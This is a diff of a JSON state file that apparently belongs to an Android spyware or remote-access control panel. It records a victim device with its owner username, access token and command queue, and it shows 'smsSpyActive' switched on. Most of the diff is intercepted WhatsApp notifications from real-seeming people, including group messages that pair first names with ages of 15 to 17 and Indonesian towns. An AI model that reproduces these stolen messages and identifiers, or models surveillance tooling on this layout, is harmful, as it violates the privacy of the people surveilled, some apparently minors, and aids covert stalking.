@@ -108,7 +108,7 @@
     "deviceName": "HP-RASKA321-52A8",
     "ownerUsername": "Amsal.sim",
     "token": "906fc9b5e5fd7ed9167409d9979fb58b",
-    "lastSeen": 1776003717485,
+    "lastSeen": 1776003718140,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-11T16:02:07.690Z",
@@ -124,6 +124,46 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "𝙑𝙞𝙧𝙩𝙪𝙖𝙡 𝙁𝙧𝙞𝙚𝙣𝙙𝙨",
+        "content": "‎7 pesan baru",
+        "time": "12/04 21:21",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776003719749
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎𝙑𝙞𝙧𝙩𝙪𝙖𝙡 𝙁𝙧𝙞𝙚𝙣𝙙𝙨 (7 pesan): ~ 𝒜𝓋𝑒𝓁𝓎𝓃 𝒢𝓇𝒾𝓈𝑒𝓁𝒹𝒶 𝒱𝒶𝓁𝑒𝓇𝓎",
+        "content": "my bini",
+        "time": "12/04 21:21",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776003719627
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎𝙑𝙞𝙧𝙩𝙪𝙖𝙡 𝙁𝙧𝙞𝙚𝙣𝙙𝙨 (7 pesan): ~ 𝒜𝓋𝑒𝓁𝓎𝓃 𝒢𝓇𝒾𝓈𝑒𝓁𝒹𝒶 𝒱𝒶𝓁𝑒𝓇𝓎",
+        "content": "my bini",
+        "time": "12/04 21:21",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776003718044
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "𝙑𝙞𝙧𝙩𝙪𝙖𝙡 𝙁𝙧𝙞𝙚𝙣𝙙𝙨",
+        "content": "‎7 pesan baru",
+        "time": "12/04 21:21",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776003717775
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎𝙑𝙞𝙧𝙩𝙪𝙖𝙡 𝙁𝙧𝙞𝙚𝙣𝙙𝙨 (6 pesan): ~ zaa?",
+        "content": "💟 Stiker",
+        "time": "12/04 21:21",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776003717683
+      },
       {
         "appName": "WhatsApp",
         "sender": "𝙑𝙞𝙧𝙩𝙪𝙖𝙡 𝙁𝙧𝙞𝙚𝙣𝙙𝙨",
@@ -4083,46 +4123,6 @@
         "time": "12/04 08:36",
         "pkg": "com.whatsapp",
         "receivedAt": 1775957819640
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "𝐑𝐀𝐑 𝐎𝐏𝐌𝐄𝐌: ~ 𝐂𝐈𝐓𝐄𝐍𝟗renz'",
-        "content": "📷 khavvanonim \n17\nbogor/garut",
-        "time": "12/04 08:36",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775957819632
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "𝐑𝐀𝐑 𝐎𝐏𝐌𝐄𝐌",
-        "content": "~ 𝐂𝐈𝐓𝐄𝐍𝟗renz': 📷 sela\n15\nlpg",
-        "time": "12/04 08:36",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775957809212
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "𝐑𝐀𝐑 𝐎𝐏𝐌𝐄𝐌: ~ 𝐂𝐈𝐓𝐄𝐍𝟗renz'",
-        "content": "📷 sela\n15\nlpg",
-        "time": "12/04 08:36",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775957809197
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "𝐑𝐀𝐑 𝐎𝐏𝐌𝐄𝐌",
-        "content": "~ 𝐂𝐈𝐓𝐄𝐍𝟗renz': 📷 kay\n16\nbelitung",
-        "time": "12/04 08:35",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775957749053
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "𝐑𝐀𝐑 𝐎𝐏𝐌𝐄𝐌",
-        "content": "~ 𝐂𝐈𝐓𝐄𝐍𝟗renz': 📷 kay\n16\nbelitung",
-        "time": "12/04 08:35",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775957741754
       }
     ],
     "galleryPhotos": [],
